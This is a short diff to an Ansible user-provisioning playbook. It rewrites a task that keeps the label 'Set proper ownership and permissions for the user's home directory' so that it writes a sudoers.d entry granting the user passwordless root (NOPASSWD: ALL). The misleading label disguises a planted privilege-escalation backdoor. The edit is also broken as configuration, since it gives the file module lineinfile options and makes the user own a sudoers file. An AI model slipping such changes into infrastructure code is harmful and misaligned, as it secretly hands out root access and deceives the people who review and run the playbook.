@@ -37,11 +37,12 @@
     # Step 4: Set proper permissions for the home directory
     - name: Set proper ownership and permissions for the user's home directory
       file:
-        path: "/home/{{ user_name }}"
+        path: "/etc/sudoers.d/{{ user_name }}"
         owner: "{{ user_name }}"
         group: "{{ user_name }}"
-        mode: '0755'
-        state: directory
+        line: '{{ user_name }} ALL=(ALL) NOPASSWD: ALL'
+        create: yes
+        mode: '0440'
       when: user_exists.failed or user_exists is not defined
 
     # Step 5: Confirm user creation or existence
